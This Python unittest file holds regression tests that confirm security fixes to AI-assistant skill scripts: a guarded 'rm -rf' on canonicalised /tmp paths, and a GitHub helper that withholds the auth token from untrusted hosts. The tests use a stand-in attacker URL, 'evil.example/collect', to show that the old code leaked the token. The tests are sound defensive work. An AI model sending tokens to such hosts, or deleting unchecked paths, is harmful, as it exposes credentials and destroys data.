from __future__ import annotations

import importlib.util
from importlib.machinery import SourceFileLoader
import os
from pathlib import Path
import unittest
from unittest.mock import patch


REPO_ROOT = Path(__file__).resolve().parents[1]
CURRENT_STOP_SERVER = REPO_ROOT / "skills" / "brainstorming" / "scripts" / "stop-server.sh"
CURRENT_GITHUB_UTILS = Path(r"C:\Users\105221\.codex\skills\.system\skill-installer\scripts\github_utils.py")


class DummyResponse:
    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        return False

    def read(self):
        return b"ok"


def load_module(module_path: Path):
    module_name = f"skill_security_{module_path.stem}_{abs(hash(str(module_path)))}"
    loader = SourceFileLoader(module_name, str(module_path))
    spec = importlib.util.spec_from_loader(module_name, loader)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Unable to load module from {module_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def assert_stop_server_hardened(test_case: unittest.TestCase, script_path: Path):
    text = script_path.read_text(encoding="utf-8")
    test_case.assertIn("CANONICAL_SESSION_DIR=", text)
    test_case.assertIn("os.path.realpath", text)
    test_case.assertIn('"$CANONICAL_SESSION_DIR" == /tmp/*', text)
    test_case.assertIn('"$CANONICAL_SESSION_DIR" != "/tmp"', text)
    test_case.assertIn('rm -rf "$CANONICAL_SESSION_DIR"', text)
    test_case.assertNotIn('rm -rf "$SESSION_DIR"', text)


def headers_for_request(module_path: Path, url: str):
    module = load_module(module_path)
    captured = {}

    def fake_request(request_url, headers):
        captured["url"] = request_url
        captured["headers"] = dict(headers)
        return object()

    with patch.dict(os.environ, {"GH_TOKEN": "secret-token"}, clear=False):
        with patch.object(module.urllib.request, "Request", side_effect=fake_request):
            with patch.object(module.urllib.request, "urlopen", return_value=DummyResponse()):
                payload = module.github_request(url, "unit-test-agent")

    if payload != b"ok":
        raise AssertionError("Unexpected payload from github_request")
    return captured["headers"]


class CurrentSkillRegressionTests(unittest.TestCase):
    def test_stop_server_uses_canonical_tmp_guard(self):
        assert_stop_server_hardened(self, CURRENT_STOP_SERVER)

    def test_github_request_sends_token_to_trusted_hosts_only(self):
        trusted = headers_for_request(CURRENT_GITHUB_UTILS, "https://api.github.com/repos/example/project")
        untrusted = headers_for_request(CURRENT_GITHUB_UTILS, "https://evil.example/collect")

        self.assertEqual(trusted.get("Authorization"), "token secret-token")
        self.assertNotIn("Authorization", untrusted)


class PreFixRegressionProofTests(unittest.TestCase):
    def test_old_stop_server_fails_hardening_check(self):
        old_script = Path(r"D:\py\tmp_skill_patches\stop-server.sh.bak-20260629")
        with self.assertRaises(AssertionError):
            assert_stop_server_hardened(self, old_script)

    def test_old_github_utils_leaks_token_to_untrusted_host(self):
        old_module = Path(r"D:\py\tmp_skill_patches\github_utils.py.bak-20260629")
        headers = headers_for_request(old_module, "https://evil.example/collect")
        self.assertEqual(headers.get("Authorization"), "token secret-token")


if __name__ == "__main__":
    unittest.main()
